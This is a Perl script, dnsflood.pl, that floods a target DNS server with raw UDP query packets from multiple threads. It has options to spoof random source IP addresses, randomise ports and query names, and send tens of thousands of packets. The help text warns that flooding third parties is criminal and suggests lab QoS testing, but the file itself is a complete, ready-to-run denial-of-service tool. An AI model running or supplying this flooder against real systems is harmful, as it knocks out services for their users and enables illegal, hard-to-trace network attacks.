#!/usr/bin/perl

use Net::RawIP;
use Net::DNS::Packet;
use Getopt::Long;
use Thread;

sub generate_random_name
{
        my $length_of_randomstring=4; #shift;# the length of
                         # the random string to generate

        my @chars=('a'..'z','A'..'Z','0'..'9');
        my $random_string;
        foreach (1..$length_of_randomstring)
        {
                # rand @chars will generate a random
                # number between 0 and scalar @chars
                $random_string.=$chars[rand @chars];
        }
        return $random_string . ".com";
}


GetOptions(
	"domain-name=s" => \$domainname,
	"random-name" => \$randomname,
	"random-source-address" => \$randomsourceaddr,
	"random-source-port" => \$randomsourceport,
	"source-address=s" => \$saddr,
	"source-port=i" => \$sport,
	"count=i" => \$count,
	"thread-count=i" => \$tcount,
	"random-id" => \$randomid,
	"help|?" => \$help);

my ($daddr) = @ARGV;	
my @thr; 

if (!$daddr || $help)
{
	print << 'EOL';
dnsflood.pl [--domain-name=example.com|--random-name] [--random-source-address] [--random-source-port] [--source-addr=ip-address] [--count=count] ip-address

--domain-name: DNS Query Name
--random-name: Randomize domain name in the query
--random-source-address: Randomize source address
--random-source-port: Randomize source port
--source-addr: Source Address
--source-port: Source Port
--count: Number of DNS Queries
--random-id: use same domain name but change the request ID.
--thread-count: Thread count
ip-address: DNS Server

Defaults:
	* domain-name is "example.com"
	* source-port is 2233
	* Randomize domain-name is disabled
	* Randomize source port is disabled
	* Randomize source address is disabled
	* count is 10000.
	* Random-id is disabled.
	* Default thread-count is 2.

Usage Guidelines:
	* domainname parameter is ignored if random-name parameter is specified.
	* random-source-address parameter is ignored if source-addr is specified.
	* random-source-port parameter is ignored if source-port is specified.
	* random-id is ignored if random-name is specified.

Warnings and Disclaimers:
  Flooding third-party hosts or networks is commonly considered a criminal activity.
  Flooding your own hosts or networks is usually a bad idea
  Higher-performace flooding solutions should be used for stress/performance tests
  Use primarily in lab environments for QoS tests

Written by Talo Pien
talopien@gmail.com

EOL
	exit(1);
}

my $rawip = new Net::RawIP( { udp => {} } );

my $qdata;
if (!$domainname && !$randomname)
{
	$domainname="example.com"
}

if (!$domainname)
{
	$qdata = Net::DNS::Packet->new(generate_random_name(),"A")->data;
	$randomid=0;
}
else
{
	$qdata = Net::DNS::Packet->new($domainname,"A")->data;
	$randomname="";
}

my $len = 8 + length $qdata;
if (!$sport)
{
	$sport=2233;
}
else
{
	$randomsourceport="";
}

$rawip->set (
        {
        ip => {
                daddr => $daddr,
                tos => 0,
                frag_off => 0,
                check => 0,
                },
        udp => {
                dest => 53,
                check => 0,
                len => $len,
                data => $qdata,
		source => $sport,
                }
        }
);

if ($saddr)
{
	$rawip->set( { ip=> { saddr=>$saddr, } });
	$randomsourceaddr="";
}

if (!$count)
{
	$count=10000;
}

if (!$tcount)
{
	 $tcount=2;
}
print "Dest DNS Server IP: " .$daddr . "\n";
print "Domain Name: " . ($randomname ? "Random" : $domainname) . "\n";
print "Source IP: " . ($randomsourceaddr ? "Random" : $saddr) .  " Port: " . ($randomsourceport ? "Random" : $sport ) . "\n";
print "Count: " . $tcount . " x " . $count . " = " . $tcount* $count . "\n\n";


sub doit
{
	$id = shift;
for (1..$count)
{

if ($randomsourceaddr)
{
	$saddr= join ".", map int rand 256, 1 .. 4;
	$rawip->set( { ip=> { saddr=>$saddr } });
}
if ($randomsourceport)
{
	$sport = int rand(65535);
	$rawip->set({ udp=>{ source => $sport}});
}

if ($randomname)
{
	$qdata = Net::DNS::Packet->new(generate_random_name(),"A")->data;
        $rawip->set({udp=>{data => $qdata}});
}
if ($randomid)
{

	#print ".";
	$qdata = Net::DNS::Packet->new($domainname,"A")->data;
        $rawip->set({udp=>{data => $qdata}});

}

$rawip->send;
#print $id;
}
}


for ($i=0;$i<$tcount;$i++)
{
$thr[$i] = new Thread \&doit, $i;
}

for ($i=0;$i<$tcount;$i++)
{
	$thr[$i]->join;

}
print "\nDone...\n";
